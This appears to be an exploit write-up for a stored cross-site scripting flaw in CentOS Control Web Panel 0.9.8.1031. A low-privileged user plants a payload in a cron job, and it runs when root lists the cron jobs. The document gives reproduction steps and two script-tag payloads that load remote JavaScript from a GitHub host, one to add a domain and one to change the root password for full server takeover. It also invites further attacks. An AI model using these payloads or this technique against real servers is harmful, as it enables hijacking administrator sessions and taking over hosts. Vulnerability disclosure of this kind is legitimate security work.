Exploiting an XSS vulnerability in the CWP control panel and escalating the attack to change the root password...

# Information

```
# Exploit Title       : CWP (CentOS Control Web Panel) Version 0.9.8.1031 - XSS to full root takeover
# Date                : 7 january 2021
# Exploit Author      : Chokri B.A.
# Vendor Homepage     : https://control-webpanel.com/
# Software Link       : Not available, user panel only available for lastest version
# Version             : 0.9.8.1031
# Tested on           : CentOS 7 / CentOS 6
# CVE                 : #
```

# Description
A simple user can add/delete/modify any option on behalf of the root user, and even change the root's password via a stored XSS vulnerability.

#  Steps to Reproduce
1. Login into the CentOS Web Panel using user credential
2. Create a new cron job using your prefered XSS payload.
3. Login as root and navigate to the list of cronjobs
4. the XSS payload will get executed.

#  Escalating
I've created 2 examples on how you can escalate this attack to take control of the full server.

1. <b>PayloadAddDomain.js</b> : add this code as your cronjob, when the root user list the cronjobs, a new domain name will be added under the choosen user.
``` 
<script type="text/javascript" src="https://raw.githubusercontent.com/TnExperts/cwppoc/main/PayloadAddDomain.js"></script>
```


2. <b>PayloadChangeRootPass.js</b> add this code as your cronjob, when the root user list the cronjobs, you will be able to change to root's password and take control of the full server.
``` 
<script type="text/javascript" src="https://raw.githubusercontent.com/TnExperts/cwppoc/main/PayloadChangeRootPass.js"></script>
```

3. You can perform any action you want as the root user. Your imagination is the limit....


#  Timeline

```
2021-01-07: Discovered the bug
2021-01-08: Reported to vendor
#: Vender accepted the vulnerability
#: The vulnerability has been fixed
#: Published
```
